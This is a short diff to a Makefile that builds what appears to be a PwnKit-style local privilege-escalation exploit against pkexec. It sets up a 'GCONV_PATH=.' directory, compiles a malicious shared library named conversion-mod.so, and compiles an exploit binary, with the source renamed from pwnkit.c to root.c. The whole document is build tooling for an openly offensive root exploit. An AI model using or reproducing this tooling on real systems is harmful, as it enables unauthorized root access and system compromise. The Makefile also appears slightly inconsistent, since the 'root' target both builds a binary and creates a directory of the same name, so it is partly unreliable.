@@ -1,11 +1,9 @@
-all:
-	root
+all: root
 
 root:
-	chmod +x root
 	mkdir 'GCONV_PATH=.'
-	cp root GCONV_PATH=.
+	cp root 'GCONV_PATH=.'
+	chmod +x GCONV_PATH=.\/root
 	mkdir root
-	cp gconv-modules root
 	gcc -shared -fPIC -o root/conversion-mod.so conversion-mod.c
-	gcc -o pwnkit pwnkit.c
+	gcc -o root root.c
